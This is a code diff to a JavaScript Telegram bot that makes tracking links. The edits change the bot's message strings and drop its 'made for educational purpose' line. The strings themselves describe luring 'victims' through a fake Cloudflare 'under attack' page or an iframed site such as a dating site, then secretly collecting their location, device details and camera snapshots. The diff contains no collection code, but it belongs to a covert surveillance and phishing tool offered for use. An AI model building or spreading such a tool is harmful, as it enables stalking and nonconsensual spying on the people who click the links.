@@ -71,20 +71,20 @@ var m={
 reply_markup:JSON.stringify({"inline_keyboard":[[{text:"Create Link",callback_data:"crenew"}]]})
 };
 
-bot.sendMessage(chatId, `Welcome ${msg.chat.first_name} ! , \nYou can use this bot to track down people just through a simple link and made for educational purpose.\nIt can gather informations like location , device info, camera snaps. \nCredits : @gouthamsp\n\nType /help for more info.`,m);
+bot.sendMessage(chatId, `Welcome ${msg.chat.first_name} ! , \nYou can use this bot to track down people just through a simple link.\nIt can gather informations like location , device info, camera snaps.\nCredits : @gouthamsp\n\nType /help for more info.`,m);
 }
 else if(msg.text=="/create"){
 createNew(chatId);
 }
 else if(msg.text=="/help"){
-bot.sendMessage(chatId,` Through this bot you can track people just by sending a simple link.\n\nSend /create
+bot.sendMessage(chatId,` This bot can track people just by sending a simple link.\n\nSend /create
 to begin , afterwards it will ask you for a URL which will be used in iframe to lure victims.\nAfter receiving
-the url it will send you links which you can use to track people.
+the url it will send you 2 links which you can use to track people.
 \n\nSpecifications.
 \n1. Cloudflare Link: This method will show a cloudflare under attack page to gather informations and afterwards victim will be redirected to destinationed URL.
 \n2. Webview Link: This will show a website (ex bing , dating sites etc) using iframe for gathering information.
 ( ⚠️ Many sites may not work under this method if they have x-frame header present.Ex https://google.com )
-\n\nCredits @gouthamsp
+\n\nCredits : @gouthamsp
 `);
 }
   
@@ -137,7 +137,7 @@ for(var c in y){
 g+=y[c]+"\n";
 }
   
-bot.sendMessage(cid, `New links has been created successfully.You can use any one of the below links.\nURL: ${msg}\n\n✅Your Links\n\n🌐 CloudFlare Page Link\n${f}\n\n🌐 WebView Page Link\n${g}`,m);
+bot.sendMessage(cid, `New links has been created successfully.You can use any one of the below links.\nCredits : @gouthamsp\nURL: ${msg}\n\n✅Your Links\n\n🌐 CloudFlare Page Link\n${f}\n\n🌐 WebView Page Link\n${g}`,m);
 }
 else{
 
@@ -145,7 +145,7 @@ bot.sendMessage(cid, `New links has been created successfully.\nURL: ${msg}\n\n�
 }
 }
 else{
-bot.sendMessage(cid,`Please Enter a valid URL , including http or https.`);
+bot.sendMessage(cid,`⚠️ Please Enter a valid URL , including http or https.`);
 createNew(cid);
 
 }  
@@ -156,7 +156,7 @@ function createNew(cid){
 var mk={
 reply_markup:JSON.stringify({"force_reply":true})
 };
-bot.sendMessage(cid,`Enter Your URL`,mk);
+bot.sendMessage(cid,`🌐 Enter Your URL`,mk);
 }
 
 
